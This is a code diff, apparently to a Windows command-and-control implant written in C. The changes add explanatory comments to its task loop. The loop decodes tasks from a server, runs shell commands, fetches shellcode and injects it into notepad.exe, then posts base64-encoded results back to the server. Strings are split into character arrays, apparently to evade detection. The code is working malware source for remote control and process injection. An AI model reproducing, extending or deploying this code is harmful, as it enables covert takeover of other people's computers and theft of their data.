@@ -655,6 +655,7 @@ void myMain()
     CHAR* b64EncodedOutput;
     DWORD b64EncodedOutputSize;
     DWORD sizeOfOutput;
+    // json for the response
     CHAR jsonFormat[] =
     {
     '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
@@ -680,6 +681,10 @@ void myMain()
             continue;
         }
 
+        // NOTE: task is an outdated name. The name should be changed with taskParams
+        // the real task is determined by reading the taskType variable
+    
+        // task is send in base64 format to prevent corrupting json
         b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);
 
         // json is empty
@@ -689,6 +694,7 @@ void myMain()
             continue;
         }
 
+        // determine the size for the base64 decoded value
         ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
         (
                 (LPCSTR)b64Task,
@@ -701,6 +707,7 @@ void myMain()
         );
         task = (CHAR*)((CALLOC)api->calloc)(taskSize+1, sizeof(CHAR));
 
+        // decode base64 encoded task value
         ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
         (
                 (LPCSTR)b64Task,
@@ -716,6 +723,7 @@ void myMain()
         CHAR whoami[] = { 'w', 'h', 'o', 'a', 'm', 'i', 0 };
         CHAR shutdown[] = { 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0 };
         CHAR executeAssembly[] = { 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
+
         if (my_strcmp(taskType, cmd) == 0)
         {
             orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
@@ -729,6 +737,7 @@ void myMain()
         else if (my_strcmp(taskType, shutdown) == 0)
         {
             const DWORD dwEncodedExitOutputSize = 17;
+            // base64 value of exitSuccess
             CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
             totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
             json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
@@ -752,6 +761,7 @@ void myMain()
         }
         else if (my_strcmp(taskType, executeAssembly) == 0)
         {
+            // use notepad.exe to inject code into
             CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
             DWORD dwShellcodeSize;
             WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
@@ -765,12 +775,18 @@ void myMain()
             continue;
         }
 
+        // determine the size for base64 encoded output value
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
+        // allocate memory for the base64 encoded value
         b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
+        // encode plain text output value
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
 
+        // calculate the final json size
         totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
+        // allocate memory for the final json
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
+        // fill the jsonFormat with relevant values
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
         PostRequest(api, wServer, port, fullPath2, json);
 
